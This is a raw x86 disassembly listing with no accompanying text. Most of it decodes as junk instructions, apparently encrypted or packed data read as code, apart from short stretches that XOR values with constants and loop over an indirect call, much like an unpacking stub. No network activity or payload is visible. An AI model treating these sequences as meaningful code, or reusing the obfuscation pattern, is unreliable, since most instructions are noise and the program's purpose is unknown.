  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0xf1544c00
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x4048f6
  40490a:	(bad)  
  40490b:	fxch   st(6)
  40490d:	(bad)  
  40490e:	sub    eax,ebp
  404910:	pop    edi
  404911:	xchg   esi,eax
  404912:	and    BYTE PTR [ecx],0x81
  404915:	xchg   ah,al
  404917:	leave  
  404918:	leave  
  404919:	out    dx,al
  40491a:	js     0x4048ab
  40491c:	out    0x4a,eax
  40491e:	mov    al,0xad
  404920:	xchg   ebx,eax
  404921:	sar    DWORD PTR [edi-0x4ed23a78],cl
  404927:	xor    BYTE PTR [ecx],ch
  404929:	cmc    
  40492a:	push   0x31c946ee
  40492f:	aam    0x6f
  404931:	scas   al,BYTE PTR es:[edi]
  404932:	ja     0x404941
  404934:	sub    DWORD PTR [esi+0x5e6c2d89],esp
  40493a:	fistp  DWORD PTR [edx-0x7b]
  40493d:	fsub   st(3),st
  40493f:	add    BYTE PTR [ebx+eax*1+0x52e7e10b],dl
  404946:	jbe    0x4049bf
  404948:	mov    bh,0xba
  40494a:	call   DWORD PTR [eax+ebx*2-0x2e7883bf]
  404951:	or     BYTE PTR [ebp-0x5d],0x55
  404955:	jmp    0x404992
  404957:	outs   dx,DWORD PTR ds:[esi]
  404958:	ret    0x5528
  40495b:	int3   
  40495c:	(bad)  [edx]
  40495e:	dec    edi
  40495f:	aaa    
  404960:	addr16 xchg edx,eax
  404962:	inc    ebx
  404963:	cmp    bh,dh
  404965:	ret    0x62ef
  404968:	repz pusha 
  40496a:	fs pop ds
  40496c:	adc    DWORD PTR [esi-0x42c2a7da],eax
  404972:	jl     0x404915
  404974:	or     bl,BYTE PTR [eax]
  404976:	mov    ecx,0x832744de
  40497b:	sar    BYTE PTR [ecx],0x93
  40497e:	mov    ss,WORD PTR [eax-0x5f]
  404981:	mov    ds:0x67625271,al
  404986:	push   0x87bad48a
  40498b:	sbb    DWORD PTR [ebp-0x1b],esi
  40498e:	icebp  
  40498f:	les    ebp,FWORD PTR [eax-0x1f58cf79]
  404995:	mov    gs,WORD PTR es:[ecx-0x62b69648]
  40499c:	pusha  
  40499d:	mov    DWORD PTR [esi+edx*8],ebp
  4049a0:	arpl   WORD PTR [edi],di
  4049a2:	mov    ds:0x31974dc4,eax
  4049a7:	ins    DWORD PTR es:[edi],dx
  4049a8:	pop    ebp
  4049a9:	jl     0x404a1c
  4049ab:	lods   al,BYTE PTR ds:[esi]
  4049ac:	repnz fwait
  4049ae:	dec    esp
  4049af:	call   0x6db4cd2b
  4049b4:	test   eax,0xc606e5de
  4049b9:	mov    ah,0xf8
  4049bb:	push   eax
  4049bc:	xor    cl,bl
  4049be:	(bad)  
  4049bf:	push   es
  4049c0:	sahf   
  4049c1:	iret   
  4049c2:	fdiv   DWORD PTR [ebx+ebp*8+0x49]
  4049c6:	not    DWORD PTR [ecx+edi*1-0x60]
  4049ca:	(bad)  
  4049cb:	pmullw mm7,QWORD PTR [eax]
  4049ce:	adc    BYTE PTR [esi+ebx*4],ch
  4049d1:	push   edx
  4049d2:	addr16 mov dl,0xcf
  4049d5:	or     DWORD PTR [esi+0x667edd95],edx
  4049db:	xchg   DWORD PTR [ebx+0x1f],esp
  4049de:	inc    ebx
  4049df:	cwde   
  4049e0:	mov    ebp,0xc96d7901
  4049e5:	dec    ecx
  4049e6:	int3   
  4049e7:	dec    esp
  4049e8:	out    0x44,eax
  4049ea:	(bad)  
  4049eb:	iret   
  4049ec:	out    0x30,eax
  4049ee:	mov    dl,0x7
  4049f0:	popa   
  4049f1:	and    eax,0x3faaae16
  4049f6:	add    ebx,edx
  4049f8:	shl    ebp,cl
  4049fa:	cmove  ebp,DWORD PTR [ebp+0x21]
  4049fe:	fwait
  4049ff:	shr    eax,1
  404a01:	inc    esp
  404a02:	jmp    0x7072:0x9ed92043
  404a09:	sub    DWORD PTR [edx-0x469bbe92],esi
  404a0f:	clc    
  404a10:	pop    ebx
  404a11:	aas    
  404a12:	je     0x4049d9
  404a14:	fld    DWORD PTR [ecx+0x21]
  404a17:	cmp    edi,DWORD PTR [edx-0x6bf8c51f]
  404a1d:	inc    eax
  404a1e:	adc    BYTE PTR [edx+0x43],bh
  404a21:	or     DWORD PTR [ebp+eax*4+0x50e6c42f],edi
  404a28:	fild   QWORD PTR [eax+0x10e17057]
  404a2e:	mov    al,ds:0x45ff9c78
  404a33:	or     al,0xe9
  404a35:	ds stc 
  404a37:	(bad)  
  404a38:	(bad)  
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	jge    0x404aaa
  404a4c:	jae    0x404a0d
  404a4e:	and    al,0x21
  404a50:	jo     0x404ac2
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404a78
  404a57:	jbe    0x404a47
  404a59:	xchg   esi,eax
  404a5a:	dec    ebx
  404a5b:	out    0xd3,eax
  404a5d:	or     DWORD PTR [ebx],edi
  404a5f:	lahf   
  404a60:	dec    eax
  404a61:	inc    ecx
  404a62:	stos   BYTE PTR es:[edi],al
  404a63:	scas   al,BYTE PTR es:[edi]
  404a64:	inc    esp
  404a65:	push   edx
  404a66:	push   edx
  404a67:	popf   
  404a68:	call   0x8d962546
  404a6d:	or     ebp,eax
  404a6f:	aam    0x6b
  404a71:	push   edi
  404a72:	test   BYTE PTR [ecx-0x86e13f8],bl
  404a78:	aaa    
  404a79:	cli    
  404a7a:	retf   0x9d6
  404a7d:	mov    al,ds:0x4afd58
  404a82:	outs   dx,DWORD PTR ds:[esi]
  404a83:	(bad)  
  404a84:	scas   eax,DWORD PTR es:[edi]
  404a85:	shl    BYTE PTR [esi-0x5cb7571a],1
  404a8b:	shl    edx,cl
  404a8d:	icebp  
  404a8e:	pop    ss
  404a8f:	dec    edx
  404a90:	sub    BYTE PTR [edx-0x63],ah
  404a93:	lock or ebx,eax
  404a96:	sbb    bh,BYTE PTR [eax]
  404a98:	sub    eax,0x691839e
  404a9d:	ds (bad) 
  404aa0:	cmp    al,0x9f
  404aa2:	pop    edx
  404aa3:	inc    esp
  404aa4:	mov    DWORD PTR [edx+0x7c],esp
  404aa7:	push   cs
  404aa8:	xlat   BYTE PTR ds:[ebx]
  404aa9:	mov    edx,0xee716535
  404aae:	cmp    DWORD PTR [edx],eax
  404ab0:	mov    ebp,0x9ce70653
  404ab5:	pop    eax
  404ab6:	ds or  eax,0x6f4db96b
  404abc:	idiv   bl
  404abe:	jbe    0x404b1d
  404ac0:	or     eax,DWORD PTR [ecx-0x59]
  404ac3:	push   cs
  404ac4:	or     dh,ch
  404ac6:	sbb    ecx,DWORD PTR [ebx-0x3855802f]
  404acc:	jo     0x404b01
  404ace:	shl    BYTE PTR [esi],0x67
  404ad1:	pop    ebp
  404ad2:	adc    BYTE PTR [edx-0x4d27b9c2],bh
  404ad8:	xor    BYTE PTR [esi],dl
  404ada:	(bad)  
  404adb:	je     0x404ab3
  404add:	or     al,0x8e
  404adf:	add    dl,bl
  404ae1:	nop
  404ae2:	inc    esi
  404ae3:	loope  0x404aa5
  404ae5:	ret    0x3c2f
  404ae8:	pop    ebp
  404ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aea:	in     eax,0xcb
  404aec:	and    ebp,eax
  404aee:	inc    edi
  404aef:	mov    ds:0x15e6b2a0,al
  404af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af5:	push   0x749fc68f
  404afa:	pop    edi
  404afb:	push   ebp
  404afc:	repz and DWORD PTR [ebx+0x3e6e8cc2],edx
  404b03:	mov    WORD PTR [edx+0x19e92434],es
  404b09:	inc    esi
  404b0a:	pop    ebp
  404b0b:	cmp    DWORD PTR [esi+0x65],esp
  404b0e:	xchg   ebx,eax
  404b0f:	mov    al,0x57
  404b11:	jmp    0x141c462c
  404b16:	cdq    
  404b17:	mov    bh,0x5e
  404b19:	test   al,0x1e
  404b1b:	adc    al,BYTE PTR [ecx-0xa]
  404b1e:	jbe    0x404b6c
  404b20:	sub    al,0x46
  404b22:	sbb    BYTE PTR ds:0x9b38c324,al
  404b28:	call   0x488f:0x62fc0d43
  404b2f:	pop    es
  404b30:	arpl   bx,di
  404b32:	xlat   BYTE PTR ds:[ebx]
  404b33:	outs   dx,BYTE PTR ds:[esi]
  404b34:	dec    edi
  404b35:	stos   DWORD PTR es:[edi],eax
  404b36:	outs   dx,BYTE PTR ds:[esi]
  404b38:	dec    eax
  404b39:	mov    edi,0xc782badc
  404b3e:	mov    al,ds:0xf47a393e
  404b43:	ret    0x22d
  404b46:	or     esi,DWORD PTR [esi+0x79947765]
  404b4c:	jle    0x404b1d
  404b4e:	jle    0x404b51
  404b50:	xchg   esi,eax
  404b51:	imul   esp,DWORD PTR [edi],0x265d7aae
  404b57:	in     al,dx
  404b58:	jl     0x404b31
  404b5a:	fcomp  QWORD PTR [edi-0x22]
  404b5d:	add    al,0xb3
  404b5f:	and    al,0xc0
  404b61:	cwde   
  404b62:	dec    edx
  404b63:	call   FWORD PTR [eax+0x6b3f9e17]
  404b69:	push   edi
  404b6a:	jmp    0xd8c98bde
  404b6f:	mov    ds:0x38ea7741,al
  404b74:	mov    WORD PTR ds:0xd242d933,fs
  404b7a:	hlt    
  404b7b:	loopne 0x404bc8
  404b7d:	ror    BYTE PTR [ebx-0x3ecc0fbb],1
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x3ca7e9c8
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404bd7
  404ba6:	mov    esp,0x1eecf83f
  404bab:	data16 ds in al,dx
  404bae:	jae    0x404bc8
  404bb0:	out    0x41,al
  404bb2:	sbb    eax,0xfbd085f4
  404bb7:	sub    edi,esp
  404bb9:	pop    es
  404bba:	shl    BYTE PTR [ecx+0x39],1
  404bbd:	mov    dl,BYTE PTR [ecx+0x2833736a]
  404bc3:	popf   
  404bc4:	in     eax,0x60
  404bc6:	push   ds
  404bc7:	stos   DWORD PTR es:[edi],eax
  404bc8:	xchg   ecx,eax
  404bc9:	and    eax,0x477152a7
  404bce:	loope  0x404c22
  404bd0:	mov    ah,0x5c
  404bd2:	(bad)  
  404bd3:	cmp    BYTE PTR [esi+0x10b9c558],ch
  404bd9:	cdq    
  404bda:	push   esp
  404bdb:	rol    DWORD PTR [edx-0x74c56332],1
  404be1:	int    0x93
  404be3:	jne    0x404baa
  404be5:	pop    ss
  404be6:	call   0x9a3b:0x60ee21c2
  404bed:	push   ss
  404bee:	jno    0x404bf4
  404bf0:	adc    eax,0x5a0d8fb4
  404bf5:	sti    
  404bf6:	cli    
  404bf7:	in     al,0x40
  404bf9:	or     edi,DWORD PTR [ecx+0x71687dd1]
  404bff:	sbb    DWORD PTR [ebx-0x57fcf511],ebx
  404c05:	or     BYTE PTR [ebx+ecx*8],0x3d
  404c09:	or     al,dl
  404c0b:	int    0x46
  404c0d:	jge    0x404be3
  404c0f:	popf   
  404c10:	push   ebx
  404c11:	and    DWORD PTR [esi+edi*8+0x30],edi
  404c15:	xchg   ebx,eax
  404c16:	pop    edi
  404c17:	test   eax,0xe4d0fe8b
  404c1c:	push   cs
  404c1d:	(bad)  
  404c1e:	std    
  404c1f:	into   
  404c20:	xor    esi,ecx
  404c22:	gs push esi
  404c24:	sub    BYTE PTR [ecx-0x5d],ah
  404c27:	xor    BYTE PTR [ecx],bl
  404c29:	mov    bl,0xff
  404c2b:	and    DWORD PTR ds:0x51ec5f52,esp
  404c31:	pop    ebx
  404c32:	and    bh,cl
  404c34:	mov    DWORD PTR [esi+0x2],edi
  404c37:	test   al,0x20
  404c39:	jno    0x404c4d
  404c3b:	aam    0x67
  404c3d:	mov    eax,0xcafe69db
  404c42:	or     DWORD PTR [edx+0x6a],ebp
  404c45:	jb     0x404c23
  404c47:	sub    al,0xb9
  404c49:	sahf   
  404c4a:	xlat   BYTE PTR ds:[ebx]
  404c4b:	jge    0x404c64
  404c4d:	fnstsw WORD PTR [edx+0x17]
  404c50:	xchg   ecx,eax
  404c51:	add    al,0x24
  404c53:	inc    edx
  404c54:	dec    edi
  404c55:	cmp    al,0x7a
  404c57:	sub    edx,DWORD PTR [edi-0x4f]
  404c5a:	pop    ecx
  404c5b:	out    0xf5,eax
  404c5d:	pop    edi
  404c5e:	cs cwde 
  404c60:	pop    ecx
  404c61:	add    ebx,esp
  404c63:	and    ebp,ebx
  404c65:	(bad)  
  404c66:	cwde   
  404c67:	mov    edi,0x9508987f
  404c6c:	dec    edx
  404c6d:	push   ss
  404c6e:	jne    0x404bf5
  404c70:	sti    
  404c71:	dec    edi
  404c72:	(bad)  
  404c73:	sbb    DWORD PTR [edi],esi
  404c75:	icebp  
  404c76:	(bad)
  404c79:	leave  
  404c7a:	(bad)  
  404c7b:	(bad)  
  404c7c:	lods   al,BYTE PTR ds:[esi]
  404c7d:	jmp    0xb2f:0x3ba2e528
  404c84:	cdq    
  404c85:	dec    esp
  404c86:	(bad)  
  404c87:	(bad)  
  404c88:	pop    ss
  404c89:	mov    eax,ds:0xe82d70e8
  404c8e:	cmp    ecx,esi
  404c90:	pop    edi
  404c91:	sbb    DWORD PTR [eax+0x73f0d290],edi
  404c97:	jge    0x404c65
  404c99:	sbb    al,0x8
  404c9b:	pop    ds
  404c9c:	in     al,0x88
  404c9e:	and    ch,BYTE PTR [edx+0x10]
  404ca1:	pop    esi
  404ca2:	sbb    al,0x7c
  404ca4:	inc    eax
  404ca5:	mov    ?,WORD PTR [edx-0x5e]
  404ca8:	jle    0x404c3c
  404caa:	and    esi,ebx
  404cac:	mov    ah,0x77
  404cae:	mov    dl,0x1b
  404cb0:	sahf   
  404cb1:	test   BYTE PTR [ecx],0xe1
  404cb4:	jmp    0xcf97fe01
  404cb9:	js     0x404c77
  404cbb:	fld    DWORD PTR [ebp-0x4221bc34]
  404cc1:	fst    DWORD PTR [ecx+0x326694cc]
  404cc7:	bound  eax,QWORD PTR ds:0xcbaf9ade
  404ccd:	mov    DWORD PTR [ecx],eax
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432dd6,0x432704
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43437e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43437e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43437e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43437e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434382
  404d22:	push   0x43438e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432c32
  404d52:	cmp    DWORD PTR ds:0x43437e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43441d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x319e646
  404d98:	fs leave 
  404d9a:	xchg   edi,eax
  404d9b:	hlt    
  404d9c:	das    
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404db2
  404da4:	xor    BYTE PTR [edx+0x2d],bl
  404da7:	or     al,0x92
  404da9:	xchg   esp,eax
  404daa:	and    DWORD PTR es:[bx+si-0x57],ecx
  404daf:	(bad)  [esi+0x52]
  404db2:	add    eax,0x862cf83d
  404db7:	mov    esi,0x27a2ece4
  404dbc:	sahf   
  404dbd:	js     0x404dfd
  404dbf:	push   eax
  404dc0:	test   al,0xc2
  404dc2:	add    dh,BYTE PTR [ebx+0xe]
  404dc5:	imul   ebp,DWORD PTR ds:[edi],0xc
  404dc9:	(bad)  
  404dca:	aam    0x6d
  404dcc:	jmp    0x404db4
  404dce:	repz mov ah,0xe7
  404dd1:	nop
  404dd2:	sbb    eax,0xdf1561e9
  404dd7:	jmp    0x38287e21
  404ddc:	mov    cl,0x1a
  404dde:	inc    eax
  404ddf:	cmp    al,0x46
  404de1:	mov    bl,cl
  404de3:	add    dh,cl
  404de5:	dec    ebp
  404de6:	hlt    
  404de7:	fst    DWORD PTR [ebp+0x59]
  404dea:	jmp    0x9ed12f03
  404def:	fcomp  QWORD PTR [eax]
  404df1:	pop    ds
  404df2:	hlt    
  404df3:	lock pop ecx
  404df5:	daa    
  404df6:	mov    edx,0xee4f00b8
  404dfb:	mov    edx,0xcaa631a4
  404e00:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e02:	dec    edi
  404e03:	sub    DWORD PTR [ebx-0xd987135],ebx
  404e09:	hlt    
  404e0a:	cwde   
  404e0b:	into   
  404e0c:	inc    edx
  404e0d:	xchg   ebx,eax
  404e0e:	shl    DWORD PTR [edi],0xef
  404e11:	xor    DWORD PTR [edi+0x27],edx
  404e14:	stos   DWORD PTR es:[edi],eax
  404e15:	mov    dh,0xaa
  404e17:	cdq    
  404e18:	daa    
  404e19:	in     eax,dx
  404e1a:	dec    ebx
  404e1b:	mov    ebp,0x479ee499
  404e20:	dec    eax
  404e21:	cs stos DWORD PTR es:[edi],eax
  404e23:	xor    DWORD PTR [esi+0x78],edx
  404e26:	ret    
  404e27:	pushf  
  404e28:	outs   dx,DWORD PTR ds:[esi]
  404e29:	cs jb  0x404dea
  404e2c:	xchg   edx,eax
  404e2d:	sub    ebp,DWORD PTR [eax+0x679510ac]
  404e33:	xchg   ebx,eax
  404e34:	mov    esi,0x33aaee30
  404e39:	iret   
  404e3a:	cmp    eax,0x78ab0c2
  404e3f:	mov    ds:0x9272172d,al
  404e44:	sahf   
  404e45:	fwait
  404e46:	test   eax,0x32f5adf5
  404e4b:	inc    ebx
  404e4c:	cmc    
  404e4d:	push   ss
  404e4e:	js     0x404e34
  404e50:	icebp  
  404e51:	pop    ecx
  404e52:	or     eax,0x29335ea7
  404e57:	fwait
  404e58:	adc    eax,0xe1f16b7e
  404e5d:	mov    DWORD PTR [edi+0x19],ebx
  404e60:	aas    
  404e61:	pmullw mm5,QWORD PTR [esi]
  404e64:	adc    BYTE PTR [edx+0x3e2b7c55],bl
  404e6a:	xor    esi,DWORD PTR [edx]
  404e6c:	neg    DWORD PTR [edi-0x32]
  404e6f:	mov    eax,0x63ba53a1
  404e74:	mov    DWORD PTR [edi+edi*8],ecx
  404e77:	enter  0x433a,0xfe
  404e7b:	lahf   
  404e7c:	or     ch,BYTE PTR [esi-0x43dccbfc]
  404e82:	cmc    
  404e83:	mov    BYTE PTR [ebx],dl
  404e85:	bound  edi,QWORD PTR [edi+0x4b352544]
  404e8b:	mov    esp,0x8ce5fbee
  404e90:	jecxz  0x404eeb
  404e92:	or     ebp,edi
  404e94:	hlt    
  404e95:	push   ds
  404e96:	add    dl,BYTE PTR [ecx+0x5a559922]
  404e9c:	cmp    ah,ch
  404e9e:	cwde   
  404e9f:	mul    ah
  404ea1:	mov    ah,0xb9
  404ea3:	arpl   dx,bx
  404ea5:	aad    0x1
  404ea7:	(bad)  
  404ea8:	dec    ebx
  404ea9:	pop    ebx
  404eaa:	mov    ebp,0xb4ab722d
  404eaf:	xchg   bh,cl
  404eb1:	out    0xfd,eax
  404eb3:	pop    ecx
  404eb4:	test   BYTE PTR [esi-0x36],bh
  404eb7:	cmc    
  404eb8:	lods   eax,DWORD PTR ds:[esi]
  404eb9:	rcr    al,1
  404ebb:	xchg   edx,eax
  404ebc:	add    eax,0xdcc90f5b
  404ec1:	js     0x404e88
  404ec3:	xchg   esi,eax
  404ec4:	mov    cs:0x370aa71e,eax
  404eca:	ret    0x121b
  404ecd:	in     al,0x48
  404ecf:	in     eax,dx
  404ed0:	xor    al,0xf3
  404ed2:	add    dl,BYTE PTR [edx-0x51]
  404ed5:	jle    0x404efa
  404ed7:	(bad)  
  404ed8:	loope  0x404e8f
  404eda:	mov    ds:0xa3e3c2c9,eax
  404edf:	xchg   esp,eax
  404ee0:	fpatan 
  404ee2:	outs   dx,DWORD PTR ds:[esi]
  404ee3:	loopne 0x404ead
  404ee5:	xchg   edx,eax
  404ee6:	sbb    BYTE PTR [esi],cl
  404ee8:	adc    BYTE PTR [edx-0x5df8211e],ah
  404eee:	add    edi,DWORD PTR [ebx-0x53e51335]
  404ef4:	stos   BYTE PTR es:[edi],al
  404ef5:	std    
  404ef6:	or     eax,0xe2e5834f
  404efb:	repz ss sub al,0x73
  404eff:	scas   eax,DWORD PTR es:[edi]
  404f00:	fs jl  0x404f78
  404f03:	push   eax
  404f04:	fwait
  404f05:	inc    esp
  404f06:	jbe    0x404e9d
  404f08:	dec    edx
  404f09:	add    ebp,DWORD PTR [esi+0x3]
  404f0c:	cld    
  404f0d:	je     0x404eec
  404f0f:	mov    cl,0xaf
  404f11:	adc    BYTE PTR [eax+eax*2-0x7f133646],dh
  404f18:	xchg   esp,eax
  404f19:	xchg   esi,eax
  404f1a:	imul   esp,DWORD PTR [edi],0xffffffbd
  404f1d:	in     eax,0x83
  404f1f:	mov    al,ds:0xfda11316
  404f24:	push   0xffffff86
  404f26:	jns    0x404ed6
  404f28:	mov    bl,0x2a
  404f2a:	and    BYTE PTR [ebx+0x64672094],bh
  404f30:	repz mov ebx,0x66d16786
  404f36:	push   eax
  404f37:	pop    edx
  404f38:	mov    eax,0x3e59f20d
  404f3d:	(bad)  
  404f3e:	ficomp DWORD PTR [esi]
  404f40:	xor    esp,DWORD PTR [ebx]
  404f42:	and    eax,ebp
  404f44:	aaa    
  404f45:	ja     0x404f48
  404f47:	aad    0x71
  404f49:	repz fcmove st,st(4)
  404f4c:	out    dx,eax
  404f4d:	aas    
  404f4e:	inc    eax
  404f4f:	lahf   
  404f50:	in     eax,0x1a
  404f52:	dec    ebp
  404f53:	mov    edx,0xabd0cd1c
  404f58:	sub    bl,BYTE PTR [edi+0x57ea63f3]
  404f5e:	or     dl,ch
  404f60:	(bad)  
  404f61:	ds shl ebp,1
  404f64:	pop    eax
  404f65:	add    al,BYTE PTR [edi-0x10]
  404f68:	shl    ebx,cl
  404f6a:	test   eax,0xc63b8d7e
  404f6f:	mov    ds:0x9c8eb30e,eax
  404f74:	int    0xea
  404f76:	scas   al,BYTE PTR es:[edi]
  404f77:	and    eax,0x2efa30aa
  404f7c:	leave  
  404f7d:	sub    al,0x60
  404f7f:	lds    edi,FWORD PTR [eax-0x63]
  404f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f83:	cdq    
  404f84:	or     BYTE PTR [edx+0x12],bh
  404f87:	and    bl,BYTE PTR [ebp+0x390c8f0e]
  404f8d:	(bad)  
  404f8e:	mov    ah,0x15
  404f90:	cmp    eax,0x38c0f16e
  404f95:	xor    BYTE PTR [ebp+edi*1+0x4910ccbc],bl
  404f9c:	jae    0x404fa2
  404f9e:	sbb    DWORD PTR [edx],eax
  404fa0:	adc    edi,DWORD PTR [ecx+0x29]
  404fa3:	mov    esp,0x2237b66f
  404fa8:	mov    edx,0x66b7fcfa
  404fad:	mov    ah,0xd6
  404faf:	mov    ah,0xe9
  404fb1:	std    
  404fb2:	xchg   edi,eax
  404fb3:	loope  0x404f44
  404fb5:	(bad)  
  404fb6:	cwde   
  404fb7:	cli    
  404fb8:	pop    ecx
  404fb9:	mov    WORD PTR [edx],cs
  404fbb:	mov    dh,BYTE PTR [eax]
  404fbd:	adc    al,0xd7
  404fbf:	mov    edx,0x278cb78e
  404fc4:	je     0x405008
  404fc6:	test   BYTE PTR [eax-0x215dfe1a],bl
  404fcc:	mov    es,WORD PTR [ebp-0x43]
  404fcf:	clc    
  404fd0:	out    dx,al
  404fd1:	add    eax,0x50e8432e
  404fd6:	jmp    0x404fda
  404fd8:	inc    esp
  404fd9:	jl     0x404f72
  404fdb:	mov    esp,0xeb588c7e
  404fe0:	adc    ecx,DWORD PTR [eax+0x61]
  404fe3:	scas   eax,DWORD PTR es:[edi]
  404fe4:	adc    edi,edx
  404fe6:	mov    al,0x31
  404fe8:	adc    eax,0xd68fb739
  404fed:	mov    ds:0x6423c637,eax
  404ff2:	push   ss
  404ff3:	out    0x12,al
  404ff5:	dec    ebx
  404ff6:	mov    ah,0x86
  404ff8:	in     eax,0x65
  404ffa:	or     al,0xc0
  404ffc:	mov    eax,cs
  404ffe:	push   ebx
  404fff:	add    BYTE PTR [ebx],cl
  405001:	or     BYTE PTR [esi],dh
  405003:	or     ecx,ebp
  405005:	inc    esi
  405006:	adc    DWORD PTR [edx],edx
  405008:	ins    BYTE PTR es:[edi],dx
  405009:	and    eax,DWORD PTR [ebx]
  40500b:	icebp  
  40500c:	xor    DWORD PTR ds:0x434396,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43438a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434396,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432dca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0x20
  40505e:	std    
  40505f:	push   ds
  405060:	aas    
  405061:	pop    ebp
  405062:	sub    eax,0x7ed97070
  405067:	jo     0x4050d9
  405069:	pop    ebx
  40506a:	pop    ebp
  40506b:	ret    
  40506c:	call   0x3cbe:0x60f53308
  405073:	daa    
  405074:	lock sub DWORD PTR [ebx],ecx
  405077:	je     0x404ffb
  405079:	cli    
  40507a:	fadd   QWORD PTR [edx+0x79]
  40507d:	cli    
  40507e:	fbstp  TBYTE PTR cs:[edx-0xf]
  405082:	loope  0x40504d
  405084:	pop    ss
  405085:	jp     0x40500c
  405087:	sti    
  405088:	cmp    dh,BYTE PTR [esi-0x3e0bcf85]
  40508e:	pop    ds
  40508f:	stos   BYTE PTR es:[edi],al
  405090:	adc    al,0xa5
  405092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405093:	jno    0x4050c7
  405095:	pushf  
  405096:	xchg   ebx,eax
  405097:	mov    edx,0xae24bd0a
  40509c:	je     0x40508b
  40509e:	jp     0x405091
  4050a0:	pop    esp
  4050a1:	pop    eax
  4050a2:	mov    BYTE PTR [edi+0xe],dl
  4050a5:	fadd   DWORD PTR [edx]
  4050a7:	sti    
  4050a8:	cmc    
  4050a9:	xchg   esp,eax
  4050aa:	jae    0x405110
  4050ac:	add    ecx,DWORD PTR [ebx-0x28d1f7ef]
  4050b2:	or     DWORD PTR [edx],0xffffffb3
  4050b5:	scas   al,BYTE PTR es:[edi]
  4050b6:	je     0x4050dc
  4050b8:	int3   
  4050b9:	je     0x40511f
  4050bb:	cdq    
  4050bc:	arpl   WORD PTR [edx+eax*4],dx
  4050bf:	leave  
  4050c0:	jae    0x4050d4
  4050c2:	das    
  4050c3:	push   0xdd018601
  4050c8:	mov    cl,0xac
  4050ca:	dec    edi
  4050cb:	aam    0x48
  4050cd:	cmp    DWORD PTR [edx-0x4b],ebx
  4050d0:	cmp    eax,0x9110c635
  4050d5:	mov    al,ds:0x80d9c304
  4050da:	mov    cl,0xac
  4050dc:	fsub   DWORD PTR [ebx-0x7d]
  4050df:	mov    dl,0x85
  4050e1:	mov    es,WORD PTR [edx+edi*2]
  4050e4:	cwde   
  4050e5:	enter  0x8c44,0xa3
  4050e9:	int    0x99
  4050eb:	mov    esi,0xc3f96746
  4050f0:	lds    ecx,FWORD PTR [ebx]
  4050f2:	cdq    
  4050f3:	pop    ebp
  4050f4:	and    al,0x86
  4050f6:	out    dx,al
  4050f7:	mov    ebx,0xe722173d
  4050fc:	mov    ebx,0x95c2b8bd
